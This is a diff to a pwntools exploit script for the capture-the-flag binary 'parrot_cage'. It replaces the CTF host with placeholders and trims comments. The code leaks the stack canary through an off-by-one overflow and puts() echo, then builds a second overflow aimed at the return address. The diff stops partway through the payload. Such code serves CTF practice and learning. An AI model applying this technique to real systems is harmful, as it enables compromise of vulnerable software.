@@ -1,22 +1,25 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF('parrot_cage', checksec=False)
+exe = ELF('./parrot_cage')
 context.binary = exe
-context.os     = 'linux'
 context.arch   = 'amd64'
+context.os     = 'linux'
 
-HOST, PORT = 'offsec.m0lecon.it', 13547
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
 
-# buf @ rbp-0x50, canary @ rbp-0x08  →  0x50 - 0x08 = 72
+# ── offsets ───────────────────────────────────────────────────────────────────
 OFFSET_TO_CANARY = 72
-OFFSET_TO_RIP    = 88   # canary (8) + saved RBP (8)
-GADGET           = 0x000000000040101a
+OFFSET_TO_RIP    = 88
+
+# ── gadgets ───────────────────────────────────────────────────────────────────
+GADGET = 0x000000000040101a   # ret — stack alignment
 
 def conn():
     if args.LOCAL:
         return process(exe.path)
-    return remote(HOST, PORT)
+    return remote(HOSTNAME, PORT)
 
 def main():
     r = conn()
@@ -24,9 +27,7 @@ def main():
     r.recvuntil(b"bye' when you're done chatting.")
     r.recv(timeout=0.2)
 
-    # ── round 1: leak canary via puts() echo ─────────────────────────────────
-    # Overwriting the canary's null byte causes puts() to print past it,
-    # leaking the 7 remaining canary bytes. Missing bytes are null by definition.
+    # ── leak phase ────────────────────────────────────────────────────────────
     r.send(b'A' * (OFFSET_TO_CANARY + 1))
 
     leaked       = r.recvline(drop=True)
@@ -34,7 +35,7 @@ def main():
     canary       = u64(b'\x00' + canary_bytes)
     log.success(f'canary = {canary:#x}')
 
-    # ── round 2: overflow with restored canary → win() ───────────────────────
+    # ── exploit phase ─────────────────────────────────────────────────────────
     payload = flat(
         b'A' * OFFSET_TO_CANARY,
         p64(canary),
